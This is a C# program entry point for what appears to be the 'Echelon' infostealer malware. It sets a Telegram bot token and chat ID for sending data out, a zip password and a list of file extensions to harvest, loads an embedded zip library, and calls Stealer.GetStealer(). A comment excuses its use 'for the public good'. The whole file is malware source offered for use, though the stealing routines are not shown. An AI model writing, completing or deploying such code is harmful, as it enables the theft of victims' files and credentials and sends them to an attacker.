using Echelon.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
//use it is... if it's for the public good 
namespace last_society
{
    class Program
    {
        
        public static string Token = "";//token API bot 

       
        public static string ID = "";//your chat id


        public static string passwordzip = "last society";

       
        public static int FileSize = 105000000;//file size

        // Список расширений для сбора файлов
        public static string[] Echelon_Size = new string[]
        {
          ".txt", ".rpd", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln", ".exe", ".vbs", ".py", ".cpp", ".config", ".", ".mp4", ".mp3", ".png",
        };

        [STAThread]
        private static void Main()
        {
            
            AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
            Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
            {
                if (args.Name.Contains("DotNetZip"))
                    return Assembly.Load(Resources.DotNetZip);
                return null;
            }


            Stealer.GetStealer();
               

        }
    }
}
